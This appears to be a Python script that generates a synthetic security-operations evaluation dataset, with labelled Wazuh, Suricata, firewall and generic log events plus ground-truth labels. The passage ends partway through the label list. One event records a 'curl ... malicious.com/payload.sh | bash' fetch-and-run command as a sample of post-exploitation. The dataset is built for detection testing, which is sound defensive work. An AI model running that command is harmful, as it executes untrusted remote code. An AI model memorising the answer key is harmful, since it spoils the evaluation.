"""Generate the research-grade synthetic evaluation dataset.

This script computes event_ids using the exact same SHA-256 formula as
backend/l1/adapters/base_adapter.py:generate_event_id() and writes all
dataset files. It does NOT run the application, tests, or evaluation.

Usage:
    python test_data/research_dataset/_generate.py
"""

from __future__ import annotations

import hashlib
import json
from pathlib import Path

OUTPUT_DIR = Path(__file__).resolve().parent


def gen_event_id(event: dict, line_number: int) -> str:
    """Replicate BaseLogAdapter.generate_event_id exactly."""
    parts = [
        str(event.get("id", "")),
        str(event.get("timestamp", "")),
        str(event.get("@timestamp", "")),
        str(line_number or ""),
    ]
    content = "|".join(parts)
    return hashlib.sha256(content.encode()).hexdigest()[:16]


# ===================================================================
# WAZUH SCENARIOS  (raw Wazuh JSON format)
# ===================================================================

wazuh_events = [
    # --- SOC-001: Brute force attack (malicious, multi-event) ---
    # 5 failures from 185.20.10.1 → triggers AUTH-001 threshold
    {"id": "SOC-001-E01", "timestamp": "2026-10-20T08:00:01Z",
     "rule": {"level": 7, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "185.20.10.1", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "49100", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 08:00:01 web-prod-01 sshd[1101]: Failed password for admin from 185.20.10.1 port 49100 ssh2"},

    {"id": "SOC-001-E02", "timestamp": "2026-10-20T08:00:05Z",
     "rule": {"level": 7, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "185.20.10.1", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "49101", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 08:00:05 web-prod-01 sshd[1102]: Failed password for admin from 185.20.10.1 port 49101 ssh2"},

    {"id": "SOC-001-E03", "timestamp": "2026-10-20T08:00:09Z",
     "rule": {"level": 7, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "185.20.10.1", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "49102", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 08:00:09 web-prod-01 sshd[1103]: Failed password for admin from 185.20.10.1 port 49102 ssh2"},

    {"id": "SOC-001-E04", "timestamp": "2026-10-20T08:00:13Z",
     "rule": {"level": 7, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "185.20.10.1", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "49103", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 08:00:13 web-prod-01 sshd[1104]: Failed password for admin from 185.20.10.1 port 49103 ssh2"},

    {"id": "SOC-001-E05", "timestamp": "2026-10-20T08:00:17Z",
     "rule": {"level": 7, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "185.20.10.1", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "49104", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 08:00:17 web-prod-01 sshd[1105]: Failed password for admin from 185.20.10.1 port 49104 ssh2"},

    {"id": "SOC-001-E06", "timestamp": "2026-10-20T08:00:22Z",
     "rule": {"level": 3, "description": "sshd: Successful login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "185.20.10.1", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "49105", "dstport": "22", "action": "success"},
     "full_log": "Oct 20 08:00:22 web-prod-01 sshd[1106]: Accepted password for admin from 185.20.10.1 port 49105 ssh2"},

    # --- SOC-002: Failed logins below threshold (benign, multi-event) ---
    {"id": "SOC-002-E01", "timestamp": "2026-10-20T09:00:01Z",
     "rule": {"level": 5, "description": "sshd: Failed login for user jsmith", "groups": ["authentication"]},
     "agent": {"name": "workstation-john", "id": "003"},
     "data": {"srcip": "192.168.1.100", "dstip": "10.0.0.5", "user": "jsmith", "protocol": "TCP", "srcport": "51001", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 09:00:01 workstation-john sshd[1201]: Failed password for jsmith from 192.168.1.100 port 51001 ssh2"},

    {"id": "SOC-002-E02", "timestamp": "2026-10-20T09:00:10Z",
     "rule": {"level": 5, "description": "sshd: Failed login for user jsmith", "groups": ["authentication"]},
     "agent": {"name": "workstation-john", "id": "003"},
     "data": {"srcip": "192.168.1.100", "dstip": "10.0.0.5", "user": "jsmith", "protocol": "TCP", "srcport": "51002", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 09:00:10 workstation-john sshd[1202]: Failed password for jsmith from 192.168.1.100 port 51002 ssh2"},

    {"id": "SOC-002-E03", "timestamp": "2026-10-20T09:00:20Z",
     "rule": {"level": 5, "description": "sshd: Failed login for user jsmith", "groups": ["authentication"]},
     "agent": {"name": "workstation-john", "id": "003"},
     "data": {"srcip": "192.168.1.100", "dstip": "10.0.0.5", "user": "jsmith", "protocol": "TCP", "srcport": "51003", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 09:00:20 workstation-john sshd[1203]: Failed password for jsmith from 192.168.1.100 port 51003 ssh2"},

    # --- SOC-003: Single failed login — typo (benign) ---
    {"id": "SOC-003-E01", "timestamp": "2026-10-20T10:15:00Z",
     "rule": {"level": 3, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "10.0.1.50", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "52001", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 10:15:00 web-prod-01 sshd[1301]: Failed password for admin from 10.0.1.50 port 52001 ssh2"},

    # --- SOC-004: Successful login from internal IP (benign) ---
    {"id": "SOC-004-E01", "timestamp": "2026-10-20T11:00:00Z",
     "rule": {"level": 3, "description": "sshd: Successful login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "10.0.1.50", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "52002", "dstport": "22", "action": "success"},
     "full_log": "Oct 20 11:00:00 web-prod-01 sshd[1302]: Accepted password for admin from 10.0.1.50 port 52002 ssh2"},

    # --- SOC-005: Privilege escalation via sudo (malicious) ---
    {"id": "SOC-005-E01", "timestamp": "2026-10-20T08:10:00Z",
     "rule": {"level": 12, "description": "sudo: User admin executed command as root", "groups": ["privilege_escalation"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "185.20.10.1", "dstip": "10.0.0.5", "user": "admin", "process": "sudo", "action": "privilege escalation"},
     "full_log": "Oct 20 08:10:00 web-prod-01 sudo: admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"},

    # --- SOC-006: Suspicious process execution (malicious) ---
    {"id": "SOC-006-E01", "timestamp": "2026-10-20T08:12:00Z",
     "rule": {"level": 10, "description": "Suspicious process execution: bash", "groups": ["process_execution"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "185.20.10.1", "dstip": "10.0.0.5", "user": "root", "process": "bash"},
     "full_log": "Oct 20 08:12:00 web-prod-01 auditd: type=EXECVE msg=audit(1698401520.456:789): argc=3 a0=\"bash\" a1=\"-c\" a2=\"curl http://malicious.com/payload.sh | bash\""},

    # --- SOC-007: Normal admin sudo by system account (benign) ---
    {"id": "SOC-007-E01", "timestamp": "2026-10-20T14:00:00Z",
     "rule": {"level": 5, "description": "sudo: User system executed command as root", "groups": ["syslog"]},
     "agent": {"name": "db-prod-01", "id": "002"},
     "data": {"srcip": "10.0.0.50", "dstip": "10.0.0.50", "user": "system", "process": "sudo", "action": "privilege escalation"},
     "full_log": "Oct 20 14:00:00 db-prod-01 sudo: system : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/logrotate /etc/logrotate.conf"},

    # --- SOC-008: Failed login for non-existent user (benign, suspicious) ---
    {"id": "SOC-008-E01", "timestamp": "2026-10-20T15:30:00Z",
     "rule": {"level": 5, "description": "sshd: Failed login for invalid user guest", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "203.0.113.99", "dstip": "10.0.0.5", "user": "guest", "protocol": "TCP", "srcport": "53001", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 15:30:00 web-prod-01 sshd[1401]: Failed password for invalid user guest from 203.0.113.99 port 53001 ssh2"},

    # --- SOC-009: Auth failure with missing fields (edge case) ---
    {"id": "SOC-009-E01", "timestamp": "2026-10-20T16:00:00Z",
     "rule": {"level": 5, "description": "sshd: Failed login", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"protocol": "TCP", "action": "failed"},
     "full_log": "Oct 20 16:00:00 web-prod-01 sshd[1501]: Failed password"},

    # --- SOC-010: Duplicate failed login events (dedup test) ---
    {"id": "SOC-010-E01", "timestamp": "2026-10-20T17:00:00Z",
     "rule": {"level": 7, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "198.51.100.5", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "54001", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 17:00:00 web-prod-01 sshd[1601]: Failed password for admin from 198.51.100.5 port 54001 ssh2"},

    {"id": "SOC-010-E02", "timestamp": "2026-10-20T17:00:00Z",
     "rule": {"level": 7, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "198.51.100.5", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "54001", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 17:00:00 web-prod-01 sshd[1601]: Failed password for admin from 198.51.100.5 port 54001 ssh2"},

    # --- SOC-011: Brute force at exact threshold (malicious, 5 events) ---
    {"id": "SOC-011-E01", "timestamp": "2026-10-20T18:00:01Z",
     "rule": {"level": 7, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "203.0.113.50", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "55001", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 18:00:01 web-prod-01 sshd[1701]: Failed password for admin from 203.0.113.50 port 55001 ssh2"},

    {"id": "SOC-011-E02", "timestamp": "2026-10-20T18:00:30Z",
     "rule": {"level": 7, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "203.0.113.50", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "55002", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 18:00:30 web-prod-01 sshd[1702]: Failed password for admin from 203.0.113.50 port 55002 ssh2"},

    {"id": "SOC-011-E03", "timestamp": "2026-10-20T18:01:00Z",
     "rule": {"level": 7, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "203.0.113.50", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "55003", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 18:01:00 web-prod-01 sshd[1703]: Failed password for admin from 203.0.113.50 port 55003 ssh2"},

    {"id": "SOC-011-E04", "timestamp": "2026-10-20T18:01:30Z",
     "rule": {"level": 7, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "203.0.113.50", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "55004", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 18:01:30 web-prod-01 sshd[1704]: Failed password for admin from 203.0.113.50 port 55004 ssh2"},

    {"id": "SOC-011-E05", "timestamp": "2026-10-20T18:02:00Z",
     "rule": {"level": 7, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "203.0.113.50", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "55005", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 18:02:00 web-prod-01 sshd[1705]: Failed password for admin from 203.0.113.50 port 55005 ssh2"},

    # --- SOC-012: Below threshold — only 4 failures (benign) ---
    {"id": "SOC-012-E01", "timestamp": "2026-10-20T19:00:01Z",
     "rule": {"level": 5, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "192.168.1.50", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "56001", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 19:00:01 web-prod-01 sshd[1801]: Failed password for admin from 192.168.1.50 port 56001 ssh2"},

    {"id": "SOC-012-E02", "timestamp": "2026-10-20T19:00:30Z",
     "rule": {"level": 5, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "192.168.1.50", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "56002", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 19:00:30 web-prod-01 sshd[1802]: Failed password for admin from 192.168.1.50 port 56002 ssh2"},

    {"id": "SOC-012-E03", "timestamp": "2026-10-20T19:01:00Z",
     "rule": {"level": 5, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "192.168.1.50", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "56003", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 19:01:00 web-prod-01 sshd[1803]: Failed password for admin from 192.168.1.50 port 56003 ssh2"},

    {"id": "SOC-012-E04", "timestamp": "2026-10-20T19:01:30Z",
     "rule": {"level": 5, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "192.168.1.50", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "56004", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 19:01:30 web-prod-01 sshd[1804]: Failed password for admin from 192.168.1.50 port 56004 ssh2"},

    # --- SOC-013: Success after failures from different IP (suspicious/benign) ---
    {"id": "SOC-013-E01", "timestamp": "2026-10-20T20:00:01Z",
     "rule": {"level": 5, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "203.0.113.10", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "57001", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 20:00:01 web-prod-01 sshd[1901]: Failed password for admin from 203.0.113.10 port 57001 ssh2"},

    {"id": "SOC-013-E02", "timestamp": "2026-10-20T20:00:10Z",
     "rule": {"level": 5, "description": "sshd: Failed login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "203.0.113.10", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "57002", "dstport": "22", "action": "failed"},
     "full_log": "Oct 20 20:00:10 web-prod-01 sshd[1902]: Failed password for admin from 203.0.113.10 port 57002 ssh2"},

    {"id": "SOC-013-E03", "timestamp": "2026-10-20T20:00:20Z",
     "rule": {"level": 3, "description": "sshd: Successful login for user admin", "groups": ["authentication"]},
     "agent": {"name": "web-prod-01", "id": "001"},
     "data": {"srcip": "10.0.1.50", "dstip": "10.0.0.5", "user": "admin", "protocol": "TCP", "srcport": "57003", "dstport": "22", "action": "success"},
     "full_log": "Oct 20 20:00:20 web-prod-01 sshd[1903]: Accepted password for admin from 10.0.1.50 port 57003 ssh2"},
]

# ===================================================================
# SURICATA SCENARIOS  (raw Suricata EVE JSON format)
# ===================================================================

suricata_events = [
    # --- SOC-014: SSH from known C2 IP (malicious) ---
    {"id": "SOC-014-E01", "timestamp": "2026-10-20T08:00:01Z", "event_type": "alert",
     "src_ip": "185.20.10.1", "src_port": 49100, "dest_ip": "10.0.0.5", "dest_port": 22, "proto": "TCP",
     "alert": {"action": "allowed", "signature_id": 2010935, "category": "Attempted Administrator Privilege Gain", "severity": 2,
               "signature": "ET SCAN Suspicious inbound SSH connection attempt from known C2"},
     "flow_id": "suricata-soc014"},

    # --- SOC-015: Normal HTTP traffic (benign) ---
    {"id": "SOC-015-E01", "timestamp": "2026-10-20T09:00:00Z", "event_type": "flow",
     "src_ip": "10.0.0.5", "src_port": 51000, "dest_ip": "93.184.216.34", "dest_port": 80, "proto": "TCP",
     "flow_id": "suricata-soc015"},

    # --- SOC-016: Malware download (malicious) ---
    {"id": "SOC-016-E01", "timestamp": "2026-10-20T08:12:30Z", "event_type": "alert",
     "src_ip": "10.0.0.5", "src_port": 54321, "dest_ip": "93.184.216.34", "dest_port": 80, "proto": "TCP",
     "alert": {"action": "allowed", "signature_id": 2024363, "category": "A Network Trojan was detected", "severity": 1,
               "signature": "ET MALWARE Known Emotet malicious.com domain resolution and payload download"},
     "flow_id": "suricata-soc016",
     "message": "Detected malware download from malicious.com"},

    # --- SOC-017: Duplicate Suricata alert (dedup test) ---
    {"id": "SOC-017-E01", "timestamp": "2026-10-20T10:00:00Z", "event_type": "alert",
     "src_ip": "10.0.0.5", "src_port": 55000, "dest_ip": "185.20.10.1", "dest_port": 443, "proto": "TCP",
     "alert": {"action": "allowed", "signature_id": 2023001, "category": "C2 Communication", "severity": 1,
               "signature": "ET CNC APT29 beaconing behavior detected"},
     "flow_id": "suricata-soc017",
     "message": "Beaconing to 185.20.10.1"},

    {"id": "SOC-017-E02", "timestamp": "2026-10-20T10:00:00Z", "event_type": "alert",
     "src_ip": "10.0.0.5", "src_port": 55000, "dest_ip": "185.20.10.1", "dest_port": 443, "proto": "TCP",
     "alert": {"action": "allowed", "signature_id": 2023001, "category": "C2 Communication", "severity": 1,
               "signature": "ET CNC APT29 beaconing behavior detected"},
     "flow_id": "suricata-soc017",
     "message": "Beaconing to 185.20.10.1"},

    # --- SOC-018: DNS to suspicious domain (benign, suspicious) ---
    {"id": "SOC-018-E01", "timestamp": "2026-10-20T11:00:00Z", "event_type": "dns",
     "src_ip": "10.0.0.50", "src_port": 53000, "dest_ip": "8.8.8.8", "dest_port": 53, "proto": "UDP",
     "dns": {"query": "update.suspicious-software-test.com", "type": "A"},
     "flow_id": "suricata-soc018"},

    # --- SOC-019: C2 beaconing (malicious) ---
    {"id": "SOC-019-E01", "timestamp": "2026-10-20T10:05:00Z", "event_type": "alert",
     "src_ip": "10.0.0.5", "src_port": 55100, "dest_ip": "185.20.10.1", "dest_port": 443, "proto": "TCP",
     "alert": {"action": "allowed", "signature_id": 2023001, "category": "C2 Communication", "severity": 1,
               "signature": "ET CNC APT29 beaconing behavior detected"},
     "flow_id": "suricata-soc019",
     "message": "Beaconing to 185.20.10.1"},

    # --- SOC-020: Port scan (benign, suspicious) ---
    {"id": "SOC-020-E01", "timestamp": "2026-10-20T12:00:00Z", "event_type": "alert",
     "src_ip": "198.51.100.20", "src_port": 40000, "dest_ip": "10.0.0.5", "dest_port": 1, "proto": "TCP",
     "alert": {"action": "allowed", "signature_id": 2010945, "category": "Informational", "severity": 3,
               "signature": "ET SCAN Potential SSH Scan"},
     "flow_id": "suricata-soc020"},

    # --- SOC-021: Normal TLS (benign) ---
    {"id": "SOC-021-E01", "timestamp": "2026-10-20T13:00:00Z", "event_type": "tls",
     "src_ip": "10.0.0.5", "src_port": 52000, "dest_ip": "172.67.182.201", "dest_port": 443, "proto": "TCP",
     "tls": {"subject": "CN=cdn.cloudflare.net", "issuer": "CN=DigiCert TLS Hybrid ECC SHA384"},
     "flow_id": "suricata-soc021"},

    # --- SOC-022: Alert with missing severity (edge case) ---
    {"id": "SOC-022-E01", "timestamp": "2026-10-20T14:00:00Z", "event_type": "alert",
     "src_ip": "10.0.0.50", "src_port": 56000, "dest_ip": "203.0.113.5", "dest_port": 8080, "proto": "TCP",
     "alert": {"action": "allowed", "signature_id": 999999, "category": "Informational",
               "signature": "ET INFO Suspicious HTTP User-Agent"},
     "flow_id": "suricata-soc022"},

    # --- SOC-023: Low severity info alert (benign) ---
    {"id": "SOC-023-E01", "timestamp": "2026-10-20T15:00:00Z", "event_type": "alert",
     "src_ip": "10.0.0.5", "src_port": 57000, "dest_ip": "1.1.1.1", "dest_port": 53, "proto": "UDP",
     "alert": {"action": "allowed", "signature_id": 2010936, "category": "Not Suspicious Traffic", "severity": 3,
               "signature": "ET INFO DNS Query to . local domain"},
     "flow_id": "suricata-soc023"},
]

# ===================================================================
# FIREWALL SCENARIOS  (raw firewall JSON format)
# ===================================================================

firewall_events = [
    # --- SOC-024: Firewall block on suspicious outbound (suspicious/benign) ---
    {"id": "SOC-024-E01", "timestamp": "2026-10-20T08:12:00Z",
     "action": "block", "interface": "LAN", "src_ip": "10.0.0.5", "src_port": 60000,
     "dst_ip": "192.168.99.1", "dst_port": 4444, "protocol": "TCP", "direction": "outbound",
     "severity": "high", "message": "Outbound to port 4444 blocked by default policy"},

    # --- SOC-025: Normal outbound HTTPS (benign) ---
    {"id": "SOC-025-E01", "timestamp": "2026-10-20T09:00:00Z",
     "action": "allow", "interface": "LAN", "src_ip": "10.0.0.50", "src_port": 61000,
     "dst_ip": "1.1.1.1", "dst_port": 443, "protocol": "TCP", "direction": "outbound",
     "severity": "info", "message": "Outbound HTTPS to 1.1.1.1 allowed by rule 50"},

    # --- SOC-026: Multiple allows from C2 IP (suspicious/benign, multi-event) ---
    {"id": "SOC-026-E01", "timestamp": "2026-10-20T10:00:00Z",
     "action": "allow", "interface": "WAN", "src_ip": "185.20.10.1", "src_port": 62000,
     "dst_ip": "10.0.0.5", "dst_port": 443, "protocol": "TCP", "direction": "inbound",
     "severity": "info", "message": "Inbound HTTPS from 185.20.10.1 allowed by rule 42"},

    {"id": "SOC-026-E02", "timestamp": "2026-10-20T10:05:00Z",
     "action": "allow", "interface": "WAN", "src_ip": "185.20.10.1", "src_port": 62001,
     "dst_ip": "10.0.0.5", "dst_port": 443, "protocol": "TCP", "direction": "inbound",
     "severity": "info", "message": "Inbound HTTPS from 185.20.10.1 allowed by rule 42"},

    {"id": "SOC-026-E03", "timestamp": "2026-10-20T10:10:00Z",
     "action": "allow", "interface": "WAN", "src_ip": "185.20.10.1", "src_port": 62002,
     "dst_ip": "10.0.0.5", "dst_port": 443, "protocol": "TCP", "direction": "inbound",
     "severity": "info", "message": "Inbound HTTPS from 185.20.10.1 allowed by rule 42"},

    # --- SOC-027: Firewall block on SMB outbound (suspicious/benign) ---
    {"id": "SOC-027-E01", "timestamp": "2026-10-20T11:00:00Z",
     "action": "block", "interface": "LAN", "src_ip": "10.0.0.5", "src_port": 63000,
     "dst_ip": "185.20.10.1", "dst_port": 445, "protocol": "TCP", "direction": "outbound",
     "severity": "high", "message": "Outbound SMB blocked by default policy"},

    # --- SOC-028: Normal DNS traffic (benign) ---
    {"id": "SOC-028-E01", "timestamp": "2026-10-20T12:00:00Z",
     "action": "allow", "interface": "LAN", "src_ip": "10.0.0.50", "src_port": 64000,
     "dst_ip": "8.8.8.8", "dst_port": 53, "protocol": "UDP", "direction": "outbound",
     "severity": "info", "message": "Outbound DNS to 8.8.8.8 allowed by rule 55"},

    # --- SOC-029: Allow with missing destination port (edge case) ---
    {"id": "SOC-029-E01", "timestamp": "2026-10-20T13:00:00Z",
     "action": "allow", "interface": "LAN", "src_ip": "10.0.0.5",
     "dst_ip": "203.0.113.10", "protocol": "TCP", "direction": "outbound",
     "severity": "info", "message": "Outbound allowed by rule 60"},

    # --- SOC-030: Inbound SSH allowed from external (benign, suspicious) ---
    {"id": "SOC-030-E01", "timestamp": "2026-10-20T14:00:00Z",
     "action": "allow", "interface": "WAN", "src_ip": "203.0.113.99", "src_port": 65000,
     "dst_ip": "10.0.0.5", "dst_port": 22, "protocol": "TCP", "direction": "inbound",
     "severity": "info", "message": "Inbound SSH from 203.0.113.99 allowed by rule 42"},
]

# ===================================================================
# GENERIC SCENARIOS  (raw generic/structured JSON format)
# ===================================================================

generic_events = [
    # --- SOC-031: Minimal fields — insufficient evidence (benign) ---
    {"id": "SOC-031-E01", "timestamp": "2026-10-20T16:00:00Z",
     "event_type": "system_event", "message": "Scheduled system check completed"},

    # --- SOC-032: Conflicting information — success flag + error message (benign, ambiguous) ---
    {"id": "SOC-032-E01", "timestamp": "2026-10-20T16:30:00Z",
     "event_type": "authentication_success", "action": "success",
     "src_ip": "10.0.0.5", "dst_ip": "10.0.0.50",
     "user": "system", "message": "Authentication succeeded but service returned error code 401"},

    # --- SOC-033: Normal scheduled task (benign) ---
    {"id": "SOC-033-E01", "timestamp": "2026-10-20T03:00:00Z",
     "event_type": "process_execution", "action": "executed",
     "src_ip": "127.0.0.1", "user": "system",
     "process": "cron", "message": "cron job /usr/local/bin/backup.sh executed successfully"},

    # --- SOC-034: Unusual login time (benign, suspicious) ---
    {"id": "SOC-034-E01", "timestamp": "2026-10-20T02:30:00Z",
     "event_type": "authentication_success", "action": "success",
     "src_ip": "10.0.1.50", "dst_ip": "10.0.0.5",
     "user": "admin", "message": "User admin logged in at 02:30 UTC"},

    # --- SOC-035: Missing timestamp (edge case) ---
    {"id": "SOC-035-E01",
     "event_type": "network_connection", "action": "allow",
     "src_ip": "10.0.0.5", "dst_ip": "10.0.0.50",
     "message": "Internal network connection allowed"},
]


# ===================================================================
# COMPUTE EVENT IDS
# ===================================================================

def compute_ids(events, filename):
    """Compute event_ids for a file's events (line numbers start at 1)."""
    results = []
    for idx, evt in enumerate(events, start=1):
        eid = gen_event_id(evt, idx)
        results.append((evt.get("id", ""), eid, idx))
    return results

wazuh_ids = compute_ids(wazuh_events, "wazuh_scenarios.json")
suricata_ids = compute_ids(suricata_events, "suricata_scenarios.json")
firewall_ids = compute_ids(firewall_events, "firewall_scenarios.json")
generic_ids = compute_ids(generic_events, "generic_scenarios.json")

# ===================================================================
# GROUND TRUTH DEFINITIONS
# ===================================================================

# Scenario-level metadata: (scenario_id, raw_event_id, label, notes, expected_rules, rag_relevant)
gt_definitions = [
    # Wazuh scenarios
    ("SOC-001", "SOC-001-E01", "malicious", "Brute force: 5 failures from 185.20.10.1 (known C2) targeting admin on critical asset. AUTH-001 threshold should trigger.", ["AUTH-001"], True),
    ("SOC-001", "SOC-001-E02", "malicious", "Part of brute force sequence.", ["AUTH-001"], True),
    ("SOC-001", "SOC-001-E03", "malicious", "Part of brute force sequence.", ["AUTH-001"], True),
    ("SOC-001", "SOC-001-E04", "malicious", "Part of brute force sequence.", ["AUTH-001"], True),
    ("SOC-001", "SOC-001-E05", "malicious", "Part of brute force sequence.", ["AUTH-001"], True),
    ("SOC-001", "SOC-001-E06", "malicious", "Successful login after brute force — strong indicator of compromise.", [], True),

    ("SOC-002", "SOC-002-E01", "benign", "3 failed logins from internal IP 192.168.1.100 by known user jsmith. Below AUTH-001 threshold of 5.", [], False),
    ("SOC-002", "SOC-002-E02", "benign", "Part of below-threshold sequence.", [], False),
    ("SOC-002", "SOC-002-E03", "benign", "Part of below-threshold sequence.", [], False),

    ("SOC-003", "SOC-003-E01", "benign", "Single failed login — likely a password typo from internal IP.", [], False),

    ("SOC-004", "SOC-004-E01", "benign", "Normal successful SSH login from internal admin IP during business hours.", [], False),

    ("SOC-005", "SOC-005-E01", "malicious", "Privilege escalation via sudo by user admin from known C2 IP. PRIV-001 should trigger (admin is in privileged users).", ["PRIV-001"], True),

    ("SOC-006", "SOC-006-E01", "malicious", "Suspicious process execution: bash with curl downloading payload from malicious.com. Indicates post-exploitation.", [], True),

    ("SOC-007", "SOC-007-E01", "benign", "Normal system administration: system user running logrotate via sudo. Privilege level is 'System' but activity is routine.", ["PRIV-001"], False),

    ("SOC-008", "SOC-008-E01", "benign", "Failed login for non-existent user 'guest' from external IP. Suspicious but no confirmed malicious outcome.", [], False),

    ("SOC-009", "SOC-009-E01", "benign", "Authentication failure with missing source IP and username. Insufficient data for confident classification.", [], False),

    ("SOC-010", "SOC-010-E01", "benign", "Duplicate event — L1 deduplication should remove the second copy. Single failed login from 198.51.100.5.", [], False),
    ("SOC-010", "SOC-010-E02", "benign", "Exact duplicate of SOC-010-E01. Should be deduplicated by L1 SHA-256 fingerprint.", [], False),

    ("SOC-011", "SOC-011-E01", "malicious", "Brute force: exactly 5 failures from 203.0.113.50 targeting admin. At AUTH-001 threshold boundary.", ["AUTH-001"], True),
    ("SOC-011", "SOC-011-E02", "malicious", "Part of brute force at threshold boundary.", ["AUTH-001"], True),
    ("SOC-011", "SOC-011-E03", "malicious", "Part of brute force at threshold boundary.", ["AUTH-001"], True),
    ("SOC-011", "SOC-011-E04", "malicious", "Part of brute force at threshold boundary.", ["AUTH-001"], True),
    ("SOC-011", "SOC-011-E05", "malicious", "Part of brute force at threshold boundary.", ["AUTH-001"], True),

    ("SOC-012", "SOC-012-E01", "benign", "4 failed logins from internal IP 192.168.1.50. Below AUTH-001 threshold of 5.", [], False),
    ("SOC-012", "SOC-012-E02", "benign", "Part of below-threshold sequence.", [], False),
    ("SOC-012", "SOC-012-E03", "benign", "Part of below-threshold sequence.", [], False),
    ("SOC-012", "SOC-012-E04", "benign", "Part of below-threshold sequence.", [], False),

    ("SOC-013", "SOC-013-E01", "benign", "2 failed logins from external IP 203.0.113.10, then success from different internal IP 10.0.1.50. Suspicious but could be admin switching networks.", [], True),
